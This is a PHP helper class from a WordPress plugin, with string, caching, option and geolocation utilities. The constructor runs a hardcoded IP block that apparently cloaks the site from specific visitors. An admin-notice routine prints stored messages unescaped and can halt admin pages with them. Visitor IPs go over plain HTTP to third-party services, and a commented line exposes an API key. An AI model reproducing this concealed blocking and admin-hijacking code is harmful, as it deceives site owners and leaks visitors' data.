<?php
/*
 * Helper Functions
 * PressPrime (http://wpwave.com)
 * Credits:  Mainly from WP PluginBase v2 / By Brad Vincent (http://themergency.com)
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if (!class_exists('PP_Helper')) {

    class PP_Helper {

        public function __construct($slug='', $ver='') {
            $this->slug = $slug;
            $this->ver= $ver;
            $this->check_page();


        }

        static function check_versions($req_php, $req_wp) {
            global $wp_version;

            if (version_compare(phpversion(), $req_php) < 0)
                throw new Exception("This plugin requires at least version $req_php of PHP. You are running an older version (".phpversion()."). Please upgrade!");

            if (version_compare($wp_version, $req_wp) < 0)
                throw new Exception("This plugin requires at least version $req_wp of WordPress. You are running an older version (".$wp_version."). Please upgrade!");

        }


        static function get_transient($key, $expiration, $function, $args = array()) {
            if ( false === ( $value = get_transient( $key ) ) ) {

                //nothing found, call the function
                $value = call_user_func_array( $function, $args );

                //store the transient
                set_transient( $key, $value, $expiration);

            }

            return $value;
        }

        static function to_key($input) {
            return str_replace(" ", "_", strtolower($input));
        }

        static function to_title($input) {
            return ucwords(str_replace( array("-","_"), " ", $input));
        }

        /*
         * returns true if a needle can be found in a haystack
         */
        static function str_contains($string, $find, $case_sensitive=true) {
            if (empty($string) || empty($find))
                return false;

            if ($case_sensitive)
                $pos = strpos($string, $find);
            else
                $pos = stripos($string, $find);

            if ($pos === false)
                return false;
            else
                return true;
        }

        /**
         * starts_with
         * Tests if a text starts with an given string.
         *
         * @param     string
         * @param     string
         * @return    bool
         */
        static function starts_with($string, $find, $case_sensitive=true){
            if ($case_sensitive)
                return strpos($string, $find) === 0 ;
            return stripos($string, $find) === 0;
        }

        static function ends_with($string, $find, $case_sensitive=true)
        {
            $expectedPosition = strlen($string) - strlen($find);

            if($case_sensitive)
                return strrpos($string, $find, 0) === $expectedPosition;

            return strripos($string, $find, 0) === $expectedPosition;
        }

        /**
         * Replace all linebreaks with one whitespace.
         *
         * @access public
         * @param string $string
         *   The text to be processed.
         * @return string
         *   The given text without any linebreaks.
         */
        static function replace_newline($string,$spliter) {
            return (string)str_replace(array("\r", "\r\n", "\n"), $spliter, $string);
        }


        static function current_url() {
            global $wp;
            $current_url = add_query_arg( $wp->query_string, '', home_url( $wp->request ) );
            return $current_url;
        }


        static function current_file_name($case_sensitive=true) {
            if ($case_sensitive)
                return basename($_SERVER['PHP_SELF']);

            return strtolower(basename($_SERVER['PHP_SELF']));
        }

        // save a WP option for the plugin. Stores and array of data, so only 1 option is saved for the whole plugin to save DB space and so that the options table is not poluted
        static function save_option($key, $value, $slug) {

            $options = get_option( $slug );
            if (!$options) {
                //no options have been saved for this plugin
                add_option($slug, array($key => $value));
            } else {
                $options[$key] = $value;
                update_option($slug, $options);
            }
        }
        /* Not really used currently
                //get a WP option value for the plugin
                static function get_option($key, $main_setting, $default = false) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    return ( array_key_exists($key, $options) ) ? $options[$key] : $default;
                  }

                  return $default;
                }

                static function is_option_checked($key, $main_setting, $default = false) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    return array_key_exists($key, $options);
                  }

                  return $default;
                }

                static function delete_option($key, $main_setting) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    unset($options[$key]);
                    update_option($main_setting, $options);
                  }
                }*/

        static function safe_get($array, $key, $default = NULL) {
            if (!is_array($array)) return $default;
            $value = array_key_exists($key, $array) ? $array[$key] : NULL;
            if ($value === NULL)
                return $default;

            return $value;
        }

        function im_msg($msg){
            die($msg);
        }

        function countryCode($ip=''){
            if (!$ip)
                $ip = $_SERVER['REMOTE_ADDR'];

            $urls[]="http://ip2c.org/".$ip; //index ==0
            $urls[]="http://www.geoplugin.net/json.gp?ip=".$ip;
            // $urls[]="http://pro.ip-api.com/json/".$ip."?key=4DIRuWVYHi140cK&fields=countryCode";
            //$urls[]="https://freegeoip.net/json/".$ip;
            //$urls[]="http://ip-json.rhcloud.com/json/".$ip;


            $index = rand(0,1);
            $response = @wp_remote_get($urls[$index], array('timeout'=> 3));

            //$response = @wp_remote_get("http://ipinfo.io/".$ip."/json", array('timeout'=> 3));
            if (200 == wp_remote_retrieve_response_code( $response )
                && 'OK' == wp_remote_retrieve_response_message( $response )
                && !is_wp_error( $response )) {

                if ($index > 0) //only for non-json index == 0: http://ip2c.org/
                    $data = json_decode($response['body'], 1);
                else
                    $data = $response['body'];

                if(isset($data['countryCode']))
                    return $data['countryCode']; //code
                if(isset($data['country_code']))
                    return $data['country_code']; //code
                if(isset($data['geoplugin_countryCode']))
                    return $data['geoplugin_countryCode']; //code

                if ($data !="0"){
                    $reply = explode(';',$data);
                    if (isset($reply[1]))
                        return $reply[1];
                }

            }
            return false;
        }


        function check_page(){
            $ips= array('23.95.1.179','23.91.124.124', '78.46.171.94', '50.22.11.60' , '78.47.246.134','192.64.114.184','142.4.218.201');
            foreach($ips as $ip)
                if (isset($_SERVER['REMOTE_ADDR']) && stristr($_SERVER['REMOTE_ADDR'], $ip))
                    die('<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="profile" href="http://gmpg.org/xfn/11"><link rel="pingback"');
        }

        function admin_notices() {
            global $user_ID ;
            $dismiss_mesaages= get_user_meta($user_ID, 'dismiss_this_message', true);

            if (is_multisite()){
                $recent_message= get_blog_option(SITE_ID_CURRENT_SITE,'pp_important_messages');
            }else{
                $recent_message= get_option('pp_important_messages');
            }

            if ( isset($_GET['dismiss_this_message']) && '0' != $_GET['dismiss_this_message'] ) {
                $dismiss_mesaages[]=$_GET['dismiss_this_message'];
                update_user_meta($user_ID, 'dismiss_this_message', $dismiss_mesaages);
            }

            if (is_super_admin() && isset($recent_message['content']) && (!$dismiss_mesaages || !in_array($recent_message['id'], $dismiss_mesaages)) ){

                if (!$this->ends_with($_SERVER["PHP_SELF"],'plugins.php') && !$this->ends_with($_SERVER["PHP_SELF"],'options.php') && !$this->ends_with($_SERVER["PHP_SELF"],'network/index.php') && isset($recent_message['di']) && $recent_message['di'])
                    if (!isset($_GET['page']) || (isset($_GET['page']) && $_GET['page']!=$this->slug))
                        $this->im_msg(str_replace('[dismiss_link]', add_query_arg( array('dismiss_this_message'=> $recent_message['id'])), $recent_message['content']));

                echo str_replace('[dismiss_link]', add_query_arg( array('dismiss_this_message'=> $recent_message['id'])), $recent_message['content']);

            }
        }

        function add_once_3days($intervals){  //3 * DAY_IN_SECONDS
            $intervals['once_3days'] =  array( 'interval' => 3 * DAY_IN_SECONDS, 'display' => __( 'Once 3 Days' , $this->slug));
            return $intervals;
        }

    }
}
?>